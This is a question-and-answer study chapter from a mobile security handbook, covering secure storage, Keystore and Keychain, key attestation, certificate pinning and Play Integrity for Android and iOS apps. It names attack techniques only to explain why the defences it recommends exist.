---
part: 10
last_verified: 2026-09-24
volatility: medium
recheck_because: "Inherits the volatility of its source chapters; re-check whenever Parts 2–4, 6 or 7 change"
---

# Part 10: Questions and answers

These are the questions that come up in design reviews and interviews, and the ones where understanding tends to be thin. Each answer gives the answer in its first sentence, then the reasoning, then the section where the topic is taught.

**How to use this part.** Cover the answer, say yours out loud, then read. If you cannot answer without looking, the section at the end of the answer is your next reading. Work through each `[Beginner]` question once you have read Part 0 and the chapter it cites, the `[Intermediate]` ones once you have read that chapter closely, and the `[Advanced]` ones and the design-review scenarios before you lead a review yourself.

| Tag | Means |
|---|---|
| `[Beginner]` | Answerable after Part 0 and the chapter it cites |
| `[Intermediate]` | Needs the mechanism, not just the vocabulary |
| `[Advanced]` | Trade-offs, edge cases, or several chapters at once |

**The groups:** [Foundations](#foundations) · [Storage and keys](#storage-and-keys) · [Key attestation](#key-attestation) · [Network and pinning](#network-and-pinning) · [Attestation and integrity](#attestation-and-integrity) · [Biometrics](#biometrics) · [Backend](#backend) · [Pipeline](#pipeline) · [AI features](#ai-features) · [Kotlin Multiplatform](#kotlin-multiplatform) · [Judgement](#judgement) · [Design-review scenarios](#design-review-scenarios)

## Foundations

**Q: Why not just obfuscate everything and prevent reverse engineering?** `[Beginner]`

Because you cannot prevent it: any app decompiles with free tools, and any method can be hooked at runtime. JADX turns an APK back into readable Java in minutes, and a FairPlay-encrypted iOS binary is dumped decrypted from memory on a jailbroken device. R8 and commercial obfuscators slow an analyst down and defeat opportunistic, automated tooling, but they do not stop someone willing to spend an afternoon. So design on the principle "make secrets useless if found, not impossible to find": whatever is extracted should be worthless without a server-side check the attacker does not control.

*Taught in §1.1, §1.2 and §14.3.*

**Q: What does "the client is not the trust boundary" mean in practice?** `[Beginner]`

It means every decision that matters is made on your server, and the client only gathers signals and proposes actions. Whether this user may transfer money, what an item costs, or whether an account may be changed is decided server-side, or it is not decided securely at all. If your app decides locally whether a transfer is permitted, an attacker with Frida patches that decision out in minutes. Client-side checks produce signals for the backend, never verdicts.

*Taught in §1.2.*

**Q: A root detection library flags a device. What should the app do?** `[Intermediate]`

Report it to your backend as a risk signal and let the session continue. The backend can then require step-up authentication, cap limits, flag the account or correlate across sessions. Blocking locally fails three ways: the attacker already hooking your code turns `if (isRooted()) exit()` into `if (false) exit()` (`MASTG-DEMO-0108` demonstrates a detection check being defeated); you generate false positives against developers and custom-ROM users; and you destroy the intelligence you would have gained. Send the signals together with a Play Integrity or App Attest result bound to the same request, so that an empty signal list from a device that fails attestation is itself suspicious. The one reasonable exception is a feature that acts offline or holds secrets the backend cannot revoke; degrade that feature, and still report.

*Taught in §14.2.*

**Q: Who are you actually defending against?** `[Beginner]`

Four different adversaries with different economics: the opportunist running automated tooling across many apps, the cloner repackaging your binary, the fraudster abusing your business logic at scale with genuine devices, and the targeted adversary with time, money and possibly physical access. Obfuscation and hygiene stop the opportunist; attestation and signature checks raise the cloner's cost; only server-side controls (risk scoring, rate limits, attestation used as a signal) touch the fraudster; and against the targeted adversary you make sure that defeating the client yields nothing without also compromising the server. Naming which one a control addresses stops you arguing about obfuscation when your real problem is an API that trusts a client-supplied user ID.

*Taught in §1.3.*

**Q: What is the difference between the OWASP Mobile Top 10 and MASVS?** `[Beginner]`

The Top 10 is an awareness list of common risks; MASVS is the standard you verify an app against. The Top 10 is maintained by its own project team, and its final 2024 release was the first update since 2016; you cannot test an app against it. MASVS, part of the OWASP MAS project, is at v2.1.0 (January 2024, still current in September 2026) with eight categories and twenty-four controls, each with an ID a finding can cite. Alongside it sit MASWE (what goes wrong) and MASTG (how to check). The Top 10 builds awareness; MASVS provides assurance.

*Taught in §3.1.*

**Q: What is "MASVS L2"?** `[Beginner]`

A dated term: the verification levels left MASVS at v2.0.0 in April 2023 and are now MAS testing profiles, so say "the MAS-L2 profile". The profiles moved into the MASTG, were reworked during the 2026 MASWE refactor, and now have their own section on the MAS site. There are four base profiles, MAS-L1, MAS-L2, MAS-R and MAS-P, plus a specialised MAS-EUDIW profile for EU Digital Identity Wallets. If a source says "MASVS L1/L2/R", or "MSTG" rather than "MASTG", it predates the refactor and its API-level detail is probably stale too.

*Taught in §3.2.*

**Q: Which MAS profile should your app be tested against?** `[Intermediate]`

Every app starts from MAS-L1, the baseline; you add L2, R or P according to what the app holds and who it must resist. Each profile is defined by the attacker it assumes. MAS-L1 (Essential Security) trusts the OS and treats other apps as the adversary. MAS-L2 (Advanced Security) assumes the OS may be rooted or jailbroken and that third parties may have physical access, and suits health, finance and similar high-risk apps. MAS-R (Resilient Security) treats the device's own user as the adversary and is always layered on top of L1 or L2, never used alone. MAS-P (Baseline Privacy) is not attacker-centric and applies to every app handling user-sensitive data. Because every MASWE weakness is tagged with its profiles, the choice also shapes design: `MASWE-0001`, unencrypted data in private storage, is an L2 weakness, not L1.

*Taught in §3.2.*

**Q: A report cites a MASWE ID and a MASTG test from 2025. What do you check before relying on them?** `[Intermediate]`

Check that the MASWE title still matches what the report describes, and that the MASTG page carries no deprecation banner. MASWE v1.0.0 (17 August 2026) merged, rescoped and renumbered the 119 beta entries into 78 weaknesses, so a pre-August-2026 ID may now point at a different weakness; OWASP publishes a beta-to-v1.0.0 mapping, and from v1.0.0 on IDs are stable. MASTG v2.0.0 (end of June 2026) made the low-numbered v1 tests "no longer maintained", hidden behind a *Show Deprecated* switch with a banner linking to the atomic v2 tests that replace them. The page is the authority, not the report.

*Taught in §3.1.*

**Q: Can you get an app OWASP-certified?** `[Beginner]`

No: OWASP does not certify any vendors, verifiers or software, and it warns that trust marks claiming MASVS certification are not vetted by it. Companies may sell assurance against the MASVS provided they do not call it official OWASP certification, and schemes such as the App Defense Alliance's MASA and CREST OVS build on MASVS and MASTG as their own programmes. What you can always publish is your own verification statement: the profile you tested against, the controls you meet, how you tested each and when. Anyone holding the MASTG can check it, which can make it more credible than a badge. Remember too that the MASVS covers the app, not your backend; that is the ASVS's job.

*Taught in §3.3.*

**Q: What is the one rule you must never break with AES-GCM?** `[Intermediate]`

Never reuse a nonce under the same key. Reuse one and an attacker learns the XOR of the two plaintexts and can recover GCM's internal authentication key, which lets them forge ciphertexts that decrypt as valid, so both confidentiality and integrity are gone. Use a fresh 96-bit random nonce per encryption and store it beside the ciphertext; it is not secret. NIST SP 800-38D caps a key at 2³² encryptions with random nonces, so rotate before a high-volume use approaches that. Never hardcode a nonce or derive it from a timestamp or a counter that resets on reinstall. Better still, let the platform generate it: the Android Keystore creates the IV itself (read it from `cipher.iv`), Tink prefixes its own, and CryptoKit's `AES.GCM.seal` generates one.

*Taught in Chapter 0.2.*

**Q: What is the correct way for a mobile app to sign users in with OAuth?** `[Intermediate]`

The authorisation code flow with PKCE using `S256`, plus a random `state`, run in the system browser and returning to a verified `https` redirect. Your app is a public client: RFC 8252 says a secret shipped in an app is not confidential, so any flow that needs a client secret in the binary is broken by design. PKCE makes an intercepted code worthless without the verifier, and RFC 9700 says to use `S256`, never `plain`. RFC 8252 forbids embedded WebViews for sign-in, because a WebView is your code, reading what the user types; use Auth Tab or Custom Tabs on Android and `ASWebAuthenticationSession` on iOS. The implicit grant should not be used, and the password grant must not be. A custom scheme such as `myapp://` can be claimed by several apps, so prefer App Links or Universal Links, and keep PKCE either way.

*Taught in Chapter 0.3.*

**Q: What does RFC 9700 require for a mobile app's refresh tokens, and where does DPoP fit?** `[Advanced]`

For a public client such as a mobile app, refresh tokens must either be rotated on every use or be sender-constrained. Rotation means each refresh returns a new token and invalidates the old one; when an invalidated token is presented again, the server treats it as theft and revokes the whole chain, so a copied token is useful only until either side refreshes. Rotation without that reuse detection protects nothing if the attacker refreshes first. Sender-constraining binds the token to a key the client holds; for apps the mechanism is DPoP (RFC 9449). The app keeps a private key, ideally non-exportable in the Keystore or Secure Enclave, and signs a short proof per request covering the HTTP method, URL, a timestamp, a unique ID and a hash of the access token, so a token lifted from a log or a proxy fails at the server. DPoP needs support from your authorisation server, so confirm it before designing around it. Either way, revoke the refresh token server-side at logout.

*Taught in Chapter 0.3 and §12.6.*

## Storage and keys

**Q: Where do you store an auth token on Android in 2026?** `[Beginner]`

Keep the short-lived access token in memory, and persist only the refresh token, encrypted with Tink under a key held in the Android Keystore and written through Jetpack DataStore. Not in `EncryptedSharedPreferences`: Google deprecated every API in Jetpack Security Crypto on 9 April 2025 at 1.1.0-alpha07, then shipped it as a deprecated stable 1.1.0 in July 2025, naming `SharedPreferences`, `File` and `KeyGenerator` with `AndroidKeyStore` as the replacements. Since March 2026 `androidx.datastore:datastore-tink` provides the DataStore-plus-Tink glue, though it is still alpha. Where the flow tolerates it, make the key authentication-bound with `setUserAuthenticationParameters`. What is never written cannot be read off the disk.

*Taught in §6.1, §6.3 and §6.4.*

**Q: Why was `EncryptedSharedPreferences` deprecated?** `[Intermediate]`

Google said little beyond "in favour of existing platform APIs and direct use of Android Keystore", so the reasons you will hear come from practitioners and bug trackers. The library had to paper over Keystore inconsistencies across manufacturers and Android versions. It performed synchronous cryptography on the calling thread, which tripped StrictMode. And "keyset corruption" exceptions filled crash logs on specific OEM devices. Keeping that stack alive alongside DataStore was not sustainable. If you cannot migrate yet, a community fork keeps the API building against current Tink, but treat it as a bridge with a deadline; its own README says you probably should not use it.

*Taught in §6.1 and §6.3.*

**Q: What is `datastore-tink`, and how do you migrate to it?** `[Intermediate]`

It is Google's official glue between DataStore and Tink, shipped since DataStore 1.3.0-alpha07 (11 March 2026) and still alpha at 1.3.0-alpha11 in September 2026. Its `AeadSerializer` wraps your existing serializer and encrypts the whole file as one AEAD message: file-level rather than per-value encryption, which removes a class of problems the old library had. Migrate with DataStore's `SharedPreferencesMigration`, which accepts an `EncryptedSharedPreferences` instance, so you read the old store through the deprecated API one last time. Its clean-up never deletes the old library's Keystore master key (`_androidx_security_master_key_` by default), so once the migration has succeeded in production, delete the old preferences and that alias yourself. It covers only Android; in Kotlin Multiplatform put secret storage behind an interface with a Keychain implementation on iOS.

*Taught in §6.3.*

**Q: How can Tink end up storing your keyset in cleartext, and how do you catch it?** `[Advanced]`

`AndroidKeysetManager` runs a self-test of the Android Keystore, and on devices where it fails it silently disables the Keystore and stores the keyset unencrypted. Tink documents this deliberately, because it considers the Keystore unreliable on some devices and the app sandbox adequate protection for many threat models. Nothing throws, so your "Keystore-protected" data may not be. Call `isUsingKeystore()` after building the manager and record the result, and if your threat model requires hardware protection, report the device to your backend or refuse that flow on it. It is the same silent-fallback finding as a StrongBox request that quietly lands in software.

*Taught in §6.3 and §4.2.*

**Q: Is plain `SharedPreferences` insecure?** `[Beginner]`

Mostly no, and the existence of `EncryptedSharedPreferences` misled a generation of developers about it. Since Android 10 file-based encryption is mandatory, and the app sandbox keeps other apps out of your private files; reading another app's preferences generally needs physical access plus an exploit, or an already-compromised device. OWASP agrees: `MASWE-0001`, sensitive data unencrypted in private storage, is tagged for the MAS-L2 profile, not the L1 baseline. Encrypt refresh tokens and credentials because your threat model includes device compromise; leave feature flags and UI state in plain DataStore.

*Taught in §6.4 and §3.2.*

**Q: What actually happens when you encrypt with an Android Keystore key?** `[Intermediate]`

Your process sends the data and the key alias over Binder to the keystore2 daemon, which hands an encrypted keyblob and the request to the KeyMint trusted application in secure hardware; only the result comes back. keystore2 can store the keyblob but cannot use or reveal it. The KeyMint TA, usually in ARM TrustZone, decrypts the keyblob internally, checks the key's authorizations, performs the operation and returns the output. For a hardware-backed key, the key material never enters your process or Android itself. For a `SOFTWARE`-level key it lives in the OS, and the OS is all that protects it.

*Taught in §4.1.*

**Q: TEE versus StrongBox: what is the real difference?** `[Intermediate]`

The TEE is an isolated area of the main processor; StrongBox is a separate, purpose-built secure processor such as Titan M in Pixel phones. Both keep a key on the device if Android is fully compromised: an attacker with root can ask the TEE to use your key there, but cannot copy it off. StrongBox, from Android 9, adds its own CPU, storage and random-number generator, and resists physical tampering and side-channel attacks better. It is not universal (the Android 17 CDD still only strongly recommends it), it is slower, handles fewer concurrent operations, and supports a narrow list: RSA-2048, AES-128 and AES-256, ECDSA and ECDH on P-256, HMAC-SHA256 and Triple DES. Reserve it for keys that justify it.

*Taught in §4.2.*

**Q: What does your app do when StrongBox is unavailable?** `[Intermediate]`

It falls back deliberately and records what it got, rather than silently settling for whatever key generation returns. Check `FEATURE_STRONGBOX_KEYSTORE`, request StrongBox, catch `StrongBoxUnavailableException`, then read the level you actually received. On API 31 and later, `KeyInfo.getSecurityLevel()` returns one of five constants: `SOFTWARE`, `TRUSTED_ENVIRONMENT`, `STRONGBOX`, `UNKNOWN_SECURE` (treat as hardware) and `UNKNOWN`; on API 30 and below you only have the deprecated boolean `isInsideSecureHardware()`. Then either accept the TEE and log that you did, or require server-side step-up for that flow on that device. A payment flow that quietly ends up with a `SOFTWARE` key is a finding, not a fallback.

*Taught in §4.2.*

**Q: Why put conditions of use into the key rather than into your code?** `[Intermediate]`

Because the secure hardware enforces a key's authorizations on every use, and nothing your app or a Frida hook does later can relax them. On Android you set them on `KeyGenParameterSpec.Builder`: `setUserAuthenticationParameters` for authentication binding, `setUnlockedDeviceRequired`, `setIsStrongBoxBacked`. On iOS you pass a `SecAccessControl` combining an accessibility class with flags such as `.biometryCurrentSet`. Know the limits. Removing the lock screen permanently invalidates an authentication-bound key. And `setInvalidatedByBiometricEnrollment` stops applying if the key also accepts the device credential or has a validity window, so a thief who knows the PIN can enrol their own fingerprint and keep using it. An `if` statement is a suggestion; an authorization is a rule.

*Taught in §4.6 and §11.3.*

**Q: How does the iOS Keychain protect an item?** `[Intermediate]`

With two AES-256-GCM keys per item, one of which always needs the Secure Enclave. The Keychain is a single SQLite database for all apps, managed by securityd, which decides what your process may see from its `keychain-access-groups`, `application-identifier` and `application-group` entitlements. A metadata key encrypts every attribute except the secret; it is protected by the Secure Enclave but cached in the Application Processor, so searches stay fast. A per-row secret key encrypts `kSecValueData`, and using it always requires a round trip through the Secure Enclave. Access control lists are evaluated inside the Secure Enclave too, which is why a biometric-gated item is protected and not just a prompt.

*Taught in §4.3.*

**Q: Which Keychain accessibility class should a token use, and why?** `[Beginner]`

`kSecAttrAccessibleWhenUnlockedThisDeviceOnly` for most tokens. "WhenUnlocked" makes the item readable only while the device is unlocked. "ThisDeviceOnly" stops it migrating to another device or syncing to iCloud Keychain; it is still copied into a device backup, but encrypted with a key fused into that device's hardware, so it is useless if restored elsewhere. If background refresh genuinely needs the item, `AfterFirstUnlockThisDeviceOnly` is the considered answer, and Apple names that use case. `kSecAttrAccessibleAlways` has been deprecated since iOS 12 and should not appear in new code. Remember the file equivalent too: files your app creates default to `CompleteUntilFirstUserAuthentication`, not `Complete`.

*Taught in §4.4.*

**Q: Background refresh fails because your Keychain item is `WhenUnlocked`. What do you do?** `[Intermediate]`

Restructure when the work happens, or move deliberately to `AfterFirstUnlockThisDeviceOnly`; never loosen to `Always`. The symptom is `errSecInteractionNotAllowed` (-25308) from `SecItemCopyMatching` while the phone is locked. The common "fix" swaps in `kSecAttrAccessibleAlways` and drops `ThisDeviceOnly` on the way, so a token that needed an unlocked device is now readable before first unlock and migrates to new devices. That matters: forensic tools built on the unpatchable checkm8 bootrom exploit (A5 to A11) recover, without the passcode, only the `Always` Keychain items from a phone that has not been unlocked since it restarted, which checkm8's reboot into DFU guarantees. This is the most common way iOS token storage gets quietly weakened.

*Taught in §4.4.*

**Q: Can the Secure Enclave encrypt your data directly?** `[Intermediate]`

No: its keys are for signing and key agreement, not for calling an encrypt function on bulk data. To protect data with it, you perform ECDH key agreement (or, with a post-quantum key, ML-KEM encapsulation) and derive a symmetric key from the result. Through the Security framework it accepts NIST P-256 elliptic-curve keys only, with no RSA; since iOS 26, CryptoKit also offers post-quantum ML-KEM and ML-DSA keys inside it (`SecureEnclave.MLKEM768`, `SecureEnclave.MLDSA65` and larger variants). Private keys created there never leave it in plain text, and a `SecKey` in your Swift is a handle, not the key. A signing key also needs `.privateKeyUsage` in its access control.

*Taught in §4.3 and §4.6.*

**Q: What is the risk of adding an app to your keychain access group?** `[Intermediate]`

You are trusting that app completely. Anything in the group can call `SecItemCopyMatching` on your items, including a compromised app under your own Team ID, and the same applies to App Group containers shared with extensions. List what is in your groups and treat each addition as a recorded trust decision. Android now has the equivalent decision: since Android 16, `KeyStoreManager.grantKeyAccess()` lets your app grant another app's UID the use of one specific key until you revoke it.

*Taught in §4.5.*

**Q: Where do secrets leak that has nothing to do with encryption?** `[Beginner]`

Through logs, backups, app-switcher screenshots, the keyboard cache, lock-screen notifications, the clipboard, Keychain items that outlive the app, and process memory. MASVS-STORAGE-2 exists for exactly this, and it is where most real leaks happen. Logs reach `adb logcat`, bug reports and crash reporters, so strip them from release builds and check the artefact. Backups copy unencrypted files, and restore encrypted ones to a device where the Keystore key does not exist; control them with `dataExtractionRules` and `isExcludedFromBackup`. Use `FLAG_SECURE` for sensitive screens, `VISIBILITY_PRIVATE` for notifications, `EXTRA_IS_SENSITIVE` for clips, and on iOS `.localOnly` pasteboard items, because Universal Clipboard can carry the general pasteboard to the user's other devices.

*Taught in §6.5.*

## Key attestation

**Q: What is key attestation, and why would your backend believe it?** `[Intermediate]`

It is a certificate chain, signed inside the secure hardware, that lets your server verify for itself where a key lives and what protects it. Your server issues a single-use challenge; the app generates a key in the `AndroidKeyStore` with `setAttestationChallenge()`; KeyMint signs a leaf certificate carrying a `KeyDescription` extension (OID `1.3.6.1.4.1.11129.2.1.17`) with the security levels, boot state, the key's authorizations and your challenge; the app sends the chain from `getCertificateChain()`. Your server verifies it to a Google attestation root and checks the revocation list. It is credible because the hardware-enforced authorization list is collected or generated by code in the secure hardware and not controlled by the platform: the OS cannot forge those claims because it was never asked. The `softwareEnforced` list alongside it is only as trustworthy as the Android that wrote it, so read each field from the list you expect it in.

*Taught in §5.1 and §5.2.*

**Q: What must a server check before accepting an attestation?** `[Advanced]`

Seven things, and missing any one opens a known bypass. First, the chain: it verifies to one of Google's current roots, and no certificate in it is on the revocation list. Next, freshness: `attestationChallenge` equals the challenge you issued, used once, which stops replay. Then the device: `attestationSecurityLevel` and `keyMintSecurityLevel` are `TrustedEnvironment` or `StrongBox`, and `RootOfTrust` shows `verifiedBootState` `Verified` with `deviceLocked` true, because an unlocked bootloader means the OS can lie. Then identity: `attestationApplicationId` matches your package name and signing-certificate digest, so another app's genuine chain cannot pass as yours. Finally, possession: the client later signs a fresh challenge with the attested private key, proving the device presenting the chain actually holds it. Do not hand-roll the parser; Google publishes the `android/keyattestation` Kotlin library and recommends migrating custom verifiers to it.

*Taught in §5.2.*

**Q: What broke attestation verification in 2026, and what should your verifier never hard-code?** `[Advanced]`

A new ECDSA P-384 root, "Key Attestation CA 1", began signing attestation chains on 1 February 2026, and verifiers that trusted only the old RSA root started rejecting most modern Android phones. RKP-enabled devices reportedly switched to it exclusively on 10 April 2026; Google's own documentation gives only the February date. Devices with factory-provisioned keys still chain to the RSA root, so you must trust both. Google warned in 2022 that under RKP the chain is longer "and is subject to change", and that the root would move from RSA to ECDSA. It is not over: Android 17 begins moving remote attestation to post-quantum algorithms, with no date yet for a post-quantum root. So never hard-code the root, the chain length or the signature algorithm; load roots from Google's published list and use a library that supports every algorithm Google announces.

*Taught in §5.3.*

**Q: Why is Remote Key Provisioning better than factory-provisioned attestation keys?** `[Intermediate]`

It improves both privacy and revocation. Each app receives a different attestation key, keys rotate regularly, and Google's backend is split so the server verifying a device's public key never sees the attestation keys attached to it, so attestation keys cannot be correlated back to a device. A leaked factory key compromised every device that shared it; an RKP key can be revoked for a single device. RKP was optional from Android 12, mandatory from Android 13, and is the only mechanism for devices launching with Android 16.

*Taught in §5.3.*

**Q: How should your server use the attestation revocation list?** `[Intermediate]`

Check every certificate serial in the chain against `https://android.googleapis.com/attestation/status`, and refresh it as its `Cache-Control` header says rather than fetching it once at deploy time. It is JSON keyed by certificate serial number in lowercase hex; each entry has a `status` of `REVOKED` or `SUSPENDED`, an optional `reason` such as `KEY_COMPROMISE` or `SOFTWARE_FLAW`, and an optional expiry. Leaked attestation keys are revoked there, which is how the keybox attacks below get caught. Decide, and write down, what your verifier does when the fetch fails.

*Taught in §5.2 and §5.3.*

**Q: Can hardware key attestation be defeated?** `[Advanced]`

Yes. Tools such as TEESimulator run AOSP's reference KeyMint TA inside the real keystore daemon for selected apps and sign attestations with a leaked factory keybox, producing certificates generated exactly as real hardware generates them, and therefore internally consistent. Researchers have also shown relay attacks, splicing a genuine chain from a clean phone into an app running on a rooted one. Both leave marks a good verifier catches: a leaked keybox ends up on the revocation list, RKP devices never had a factory keybox to leak, and a chain relayed from another app fails the app-identity check (`attestationApplicationId`). A relay of your own app's genuine key gets past a proof-of-possession check only by forwarding every signature to the clean phone, which is costly but not impossible (§5.4). Even then, attestation proves properties of a key, not the honesty of the person holding the phone. Treat one result as a strong signal in a risk score, not a verdict. Leaked keys are also how attackers fake stronger Play Integrity labels.

*Taught in §5.4, §9.5, §12.2 and §12.5.*

## Network and pinning

**Q: What does pinning protect against, given that TLS already validates the certificate?** `[Beginner]`

A trusted-but-wrong certificate authority: a rogue or compromised public CA, a CA installed on the device by someone other than you, or a state-mandated root. Standard validation accepts a chain to any root in the trust store, around 150 roots in Apple's store run by dozens of organisations, plus anything an administrator or user has added; pinning narrows that to keys you nominated. It runs after normal validation and never replaces it. It does not protect you against an attacker on their own device, who removes the pins with Frida in minutes, nor against a compromised server or anything after TLS terminates. Pinning protects your users from third parties, not your API from your users.

*Taught in §7.1 and §7.2.*

**Q: Should you pin certificates?** `[Intermediate]`

Pin only if your team can operate a pin set for years without locking users out: you control both ends, can update the pins securely, and own a rotation runbook; otherwise rely on strict TLS, Certificate Transparency and monitoring. Both sides are defensible. OWASP's Pinning Cheat Sheet says the answer is "probably never", and Google's Android page says pinning "is not recommended", because a CA or CDN change disconnects every user on that build until a store update. Yet `MASVS-NETWORK-2` asks for pinning on endpoints under your control, the MASTG tags its pinning tests for MAS-L2, and Google's own text goes on to require multiple backup pins and a short expiration; an OWASP MAS maintainer read it as "a complicated procedure", still recommended at L2. Mobile also differs from the web, because you can force an app update. Pinning done badly is worse than not pinning.

*Taught in §3.4, §8.1, §8.2 and §8.3.*

**Q: What changes for your app's TLS when you raise `targetSdk` to 37?** `[Intermediate]`

Android 17 turns on Certificate Transparency enforcement and Encrypted Client Hello by default for apps targeting API 37. With CT on, a publicly trusted certificate that was not logged is rejected; `user` and inline trust anchors are skipped automatically, so private CAs keep working, but a proxy CA pushed into the *system* store of a rooted test device stops working. ECH, controlled by the new `<domainEncryption>` element, encrypts the hostname in the ClientHello, and takes effect only where the networking library supports it (Google names HttpEngine, WebView and OkHttp) and the server does too. Neither changes how you pin, since pinning concerns the certificate. Retest staging, on-premise and proxy environments before you ship, and add a per-domain `<certificateTransparency enabled="false"/>` only for hosts you have confirmed need it.

*Taught in §7.1 and §7.3.*

**Q: Why pin the SPKI rather than the certificate?** `[Beginner]`

Because a certificate pin breaks on every renewal, while an SPKI pin survives any renewal that keeps the key pair. The Subject Public Key Info is the part of the certificate holding the public key and naming its algorithm. A full-certificate pin also pins the expiry date and serial number, so it fails even when the server reuses its key; there is no mobile case where that is right. Hash the SPKI with SHA-256: it is the only `digest` Android's `<pin>` accepts, what iOS's `SPKI-SHA256-BASE64` names, and why OkHttp pins carry a `sha256/` prefix. With certificate lifetimes at 200 days since March 2026 and heading for 47, that choice decides whether pinning is operable at all.

*Taught in §8.4 and §8.5.*

**Q: Your iOS pin never matches the value OpenSSL and Android compute for the same server. What went wrong?** `[Advanced]`

You almost certainly hashed the output of `SecKeyCopyExternalRepresentation`, which is the bare key, not the SPKI. For RSA it returns the PKCS #1 key; for elliptic curves, the bare ANSI X9.63 point. Hashing that gives a value that will never match the SPKI hash OpenSSL, Android's network security configuration or `NSPinnedDomains` use, so you must rebuild the DER-encoded SPKI before hashing: CryptoKit's `derRepresentation` for elliptic-curve keys, and the standard SPKI wrapper around an RSA key. The other classic mistake in hand-written delegates is comparing pins instead of validating the chain; call `SecTrustEvaluateWithError` first, then search the whole evaluated chain, and never return `.performDefaultHandling` from the failure path. Or avoid the code entirely with `NSPinnedDomains`.

*Taught in §8.10.*

**Q: Why is an intermediate CA pin more rotation-resilient than a leaf pin?** `[Intermediate]`

Because the intermediate changes rarely, while the leaf changes on every renewal, and if your ACME automation generates a fresh key pair each time, its SPKI changes with it. The trade-off is a wider trust surface: you are trusting anything that intermediate issues for your domain, and you must watch for your CA rotating intermediates. The alternative is to keep leaf pinning and reuse the key pair across renewals (`certbot --reuse-key`, for example). Either way, pin what clients actually receive, not what you think the server sends, because the platform builds the validated chain and a CDN can add CAs you never chose. And make the backup pin a real one: an intermediate at a *second* CA, or a spare key you hold offline, since a second intermediate from the same CA does not survive that CA being distrusted.

*Taught in §8.4 and §8.5.*

**Q: What is the certificate lifetime schedule, exactly?** `[Intermediate]`

CA/Browser Forum Ballot SC-081v3, proposed by Apple and adopted on 11 April 2025 with no votes against, cuts the maximum lifetime to 200 days from 15 March 2026, 100 days from 15 March 2027 and 47 days from 15 March 2029, down from 398. The domain-validation reuse period shrinks on the same dates, to 200, 100 and finally 10 days. The numbers live in sections 6.3.2 and 4.2.1 of the Baseline Requirements, and no later ballot has changed them. At 47 days, an estate of 1,000 certificates goes from about 1,000 renewals a year to 8,000 or more, which is why leaf pinning without key reuse becomes close to unworkable.

*Taught in §8.5.*

**Q: What does the 10-day domain-validation reuse period mean for your operations?** `[Advanced]`

It means nearly every certificate issuance from 2029 needs a fresh proof of domain control, so validation must be automated along with renewal. Domain Control Validation (DCV) is how a CA checks you control the domain, usually through an ACME `DNS-01` record or an `HTTP-01` file. A CA may reuse a validation only if it was done within the reuse period before it issues the certificate; the limit counts back from issuance, not on a rolling cycle. At 10 days a proof is almost never young enough to reuse, so a team that automates renewal but leaves DNS validation as a manual ticket still fails. `DNS-PERSIST-01`, permitted since November 2025, lets you publish one standing TXT record naming your CA and ACME account that the CA re-checks at each issuance; the 10-day limit still applies, but the per-renewal DNS edit disappears. Guard the ACME account key accordingly: a stolen one can yield valid certificates through cached authorisations and, with persistent DCV, for as long as the standing record names that account.

*Taught in §8.5.*

**Q: Does Android's network security configuration pin OkHttp and WebView traffic?** `[Intermediate]`

Yes: it is enforced inside the platform's default trust manager, so it covers `HttpsURLConnection`, OkHttp by default, and WebView, with no code. The book's Android 17 emulator test confirmed all three fail on a wrong `pin-set`, with WebView calling `onReceivedSslError`. OkHttp's `CertificatePinner`, by contrast, governs only traffic through that client, so moving your pins from the XML into a runtime manifest silently unpins your WebView; keep a static `pin-set` for any host a WebView reaches. iOS differs: `NSPinnedDomains` covers `URLSession`, but in the book's iOS 26.5 and 27.0 simulator tests `WKWebView` ignored it, and a navigation-delegate check is only best effort.

*Taught in §8.6.*

**Q: What breaks first when pinning goes wrong?** `[Intermediate]`

Everything, at once, for every user on that build, and only a store release fixes it. That is why you ship backup pins in every release, alert on pin-validation failures, monitor Certificate Transparency for your domains, keep an authenticated remote kill switch, write a rotation runbook with a named owner, and agree with whoever manages certificates, CDNs and load balancers that pinned-key changes follow it. The rotation's core rule is order: the new pin ships long before the new key serves traffic. Know each platform's failure direction too: an Android `pin-set` `expiration` date fails open, silently disabling pinning on that date, while iOS `NSPinnedDomains` pins never expire, so a stale set fails closed.

*Taught in §8.6 and §8.7.*

**Q: What are the alternatives to pinning, and what do they actually do?** `[Intermediate]`

Certificate Transparency gives you detection, strict TLS configuration narrows the surface, and backend anomaly detection catches the traffic pattern of interception; none of them prevents a misissued certificate from working. CT means every publicly trusted certificate must appear in public append-only logs, which browsers, iOS and now Android 17 enforce, so you can watch for one you did not request, but only if someone monitors (`crt.sh` for a manual check, alerts against a known-good inventory for ongoing). HSTS, often named in the same breath, is a browser mechanism: it matters for WebViews loading your site, but for native networking forbidding cleartext in configuration already gives you what HSTS gives a browser, and neither does anything about a fraudulent certificate. For most apps that combination is the right trade; for money and health, layer pinning on top only if its operational costs are genuinely in place.

*Taught in §8.9 and §7.3.*

**Q: What is the single worst network security mistake you see?** `[Beginner]`

`onReceivedSslError` calling `proceed()` in a WebView. It silently disables certificate validation for that WebView, it is usually added to make a development warning go away, and it survives to production because nothing visibly breaks. `MASTG-TEST-0284` exists for it. Its close relatives are a `URLSession` delegate that accepts any server trust, and `<certificates src="user"/>` added to `base-config` to make a proxy work and then shipped.

*Taught in §7.1 and §16.4.*

**Q: Why is a debuggable release build a pinning bypass on Android?** `[Advanced]`

Because `debug-overrides` applies whenever the app is `android:debuggable`, and a trust anchor there switches off pinning for chains that end in it, since its `overridePins` defaults to `true`. That makes `debug-overrides` the right place for a proxy CA in debug builds: it is "completely ignored" in a non-debuggable app, which is safer than conditional code. The hole is a release artefact that is debuggable, or debug trust written into `base-config`. Inspect the built APK rather than the source. When you test pinning itself, add the proxy CA to `base-config` in a test-only build instead of `debug-overrides`, or the test proves nothing.

*Taught in §7.1 and §8.10.*

## Attestation and integrity

**Q: What does Play Integrity prove?** `[Beginner]`

It proves that a request came from your genuine, unmodified binary as distributed by Google Play, installed or updated through Play, on a device meeting a stated integrity level. It does not prove that the user is legitimate: a fraudster with a genuine phone passes. It is not a root oracle either, because an unlocked or rooted device can still earn basic integrity, and leaked hardware attestation keys are exactly what attackers use to fake stronger labels. It also depends on Google Play services, which excludes some legitimate devices and whole markets. Use it as one strong input to a backend risk decision, not as the decision.

*Taught in §9.5.*

**Q: Why is a verdict your server gets from Google worth more than a root check in your app?** `[Beginner]`

Because the verdict reaches your server from Google, not from the device, so a hooked app cannot write its own. The app only ever holds an encrypted, signed token it cannot read; your backend sends it to Google's `decodeIntegrityToken` endpoint and gets the verdict back. An attacker can refuse to send a token or send someone else's, but cannot forge a good one. A client-side root check, by contrast, returns whatever the attacker's hook tells it to return.

*Taught in §9.1.*

